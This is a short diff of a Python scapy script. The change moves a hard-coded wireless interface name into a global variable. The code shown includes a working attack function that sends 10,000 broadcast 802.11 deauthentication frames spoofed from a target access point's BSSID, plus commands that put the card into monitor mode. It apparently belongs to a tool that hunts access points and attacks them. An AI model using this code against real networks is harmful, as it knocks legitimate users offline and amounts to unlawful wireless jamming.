@@ -10,6 +10,7 @@ from scapy.all import *
 ap_list = []
 threats = []
 halt = False
+interface = "wlan0"
 
 def packethandler(pkt) :
         if pkt.haslayer(Dot11) :
@@ -31,11 +32,10 @@ def attack(target):
 	brdmac = "ff:ff:ff:ff:ff:ff"
 	pkt = RadioTap() / Dot11(addr1=brdmac,addr2=target,addr3=target)/ Dot11Deauth()
 	print "Attacking Network with BSSID %s" %target
-	sendp(pkt, iface = "wlx00c0ca82925c", count = 10000, inter = .2) 	
+	sendp(pkt, iface = interface, count = 10000, inter = .2) 	
 
 
 if __name__ == "__main__":
-	interface = "wlx00c0ca82925c"
 	os.system('ifconfig %s down' %interface)
 	os.system('iwconfig %s mode monitor' %interface)
 	os.system('ifconfig %s up' %interface)
